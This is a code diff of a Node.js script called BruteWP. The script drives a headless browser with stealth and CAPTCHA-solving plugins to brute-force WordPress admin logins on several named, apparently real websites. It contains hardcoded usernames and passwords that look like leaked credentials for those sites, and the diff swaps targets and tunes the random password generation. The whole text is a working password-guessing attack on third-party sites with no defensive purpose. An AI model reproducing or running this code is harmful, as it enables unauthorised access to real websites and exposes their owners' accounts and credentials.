@@ -18,7 +18,7 @@ puppeteer.use(pluginStealth());
 puppeteer.use(recaptchaPlugin);
 
 
-// require('events').EventEmitter.defaultMaxListeners = 0;
+require('events').EventEmitter.defaultMaxListeners = 0;
 // console.log(require('events').EventEmitter.defaultMaxListeners)
 // console.log(process)
 class BruteWP {
@@ -28,7 +28,7 @@ class BruteWP {
             this.n = 0;
             this.brute = tress((data, callback) => {
                 this.bruteInit(data, callback);
-            }, 20);
+            }, 10);
             this.brute.drain = () => {
                 console.timeEnd("Brute Work");
                 resolve();
@@ -42,7 +42,9 @@ class BruteWP {
     }
     async bruteInit() {
         // return new Promise(async (resolve, reject) => {
-            let url = "https://garbis.com.ua/wp-admin/";
+            let url = "https://babyforyou.org/wp-admin/";
+            // let url = "https://artemida.ua/wp-admin/";
+            // let url = "https://garbis.com.ua/wp-admin/";
             // let url = "https://holiday.ua/wp-admin/";
             // let url = "https://nobimu.no/wp-admin";
             puppeteer.launch({args: ["--no-sandbox", '--disable-setuid-sandbox'], headless: true}).then(async browser => {//this.browser =
@@ -53,15 +55,17 @@ class BruteWP {
                 await page.setJavaScriptEnabled(false);
                 await page.goto(url);
                 await page.solveRecaptchas();
-                let status = await this.checkPassword({login:"Garbis1",password:"nE3qMdsLPRAg"},page);
+                let status = "/wp-login.php";
+                // let status = await this.checkPassword({login:"Garbis1",password:"nE3qMdsLPRAg"},page);
 
                 // status = await this.checkPassword({login:"Garbis",password:"nE3qMdsLPRAg"},page);
-                status = await this.checkPassword({login:"WebDevTravel",password:"BVUj7(!kIin!Kcqs^UHHtf2r"},page);
-                status = await this.checkPassword({login:"museum-user",password:"H01eOiLTQjxagz5by5"},page);
+                // status = await this.checkPassword({login:"WebDevTravel",password:"BVUj7(!kIin!Kcqs^UHHtf2r"},page);
+                // status = await this.checkPassword({login:"museum-user",password:"H01eOiLTQjxagz5by5"},page);
 
                 do {
                     status = await this.checkPassword(
-                        {login:"Garbis",password:this.generatePassword(12,false)},
+                        {login:"badmin",
+                            password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) },
                         page
                     );
                     this.n++;
@@ -138,7 +142,7 @@ class BruteWP {
             chars += '-_ []{}<>~`+=,.;:/?|';
         }
         for ( let i = 0; i < length; i++ ) {
-            password += chars.substr(randomInt(length),1);
+            password += chars.substr(randomInt(chars.length),1);
         }
         return password;
     }
